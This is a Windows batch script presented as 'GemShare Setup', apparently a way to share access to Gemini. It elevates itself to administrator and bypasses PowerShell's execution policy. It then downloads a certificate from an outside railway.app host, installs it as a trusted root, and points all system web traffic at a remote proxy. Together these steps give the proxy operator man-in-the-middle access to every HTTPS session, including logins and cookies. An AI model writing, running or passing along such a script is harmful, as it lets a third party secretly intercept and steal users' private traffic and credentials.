@echo off
title GemShare Setup

:: ── Self-elevate to Administrator ──────────────────────────────────────────
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator rights...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

:: ── Run setup ───────────────────────────────────────────────────────────────
powershell -ExecutionPolicy Bypass -Command ^
    "$reg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings';" ^
    "Set-ItemProperty $reg ProxyEnable 0;" ^
    "Write-Host '[1/3] Downloading certificate...' -ForegroundColor Yellow;" ^
    "try {" ^
    "  $b = (Invoke-WebRequest 'https://oauth-vpn-production.up.railway.app/cert' -UseBasicParsing -NoProxy).Content;" ^
    "  $c = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$b);" ^
    "  $s = New-Object System.Security.Cryptography.X509Certificates.X509Store('Root','LocalMachine');" ^
    "  $s.Open('ReadWrite'); $s.Add($c); $s.Close();" ^
    "  Write-Host '[2/3] Certificate installed.' -ForegroundColor Green;" ^
    "} catch { Write-Host ('FAILED: ' + $_) -ForegroundColor Red; pause; exit 1 };" ^
    "Set-ItemProperty $reg ProxyEnable 1;" ^
    "Set-ItemProperty $reg ProxyServer 'tramway.proxy.rlwy.net:25307';" ^
    "Set-ItemProperty $reg ProxyOverride 'localhost;127.0.0.1;<local>';" ^
    "$t = Add-Type -MemberDefinition '[DllImport(""wininet.dll"")] public static extern bool InternetSetOption(IntPtr h,int o,IntPtr b,int l);' -Name W -Namespace N -PassThru;" ^
    "$t::InternetSetOption(0,39,0,0)|Out-Null; $t::InternetSetOption(0,37,0,0)|Out-Null;" ^
    "Write-Host '[3/3] Proxy enabled.' -ForegroundColor Green;" ^
    "Write-Host '';" ^
    "Write-Host '=== Done! Open gemini.google.com in Chrome ===' -ForegroundColor Cyan;"

pause
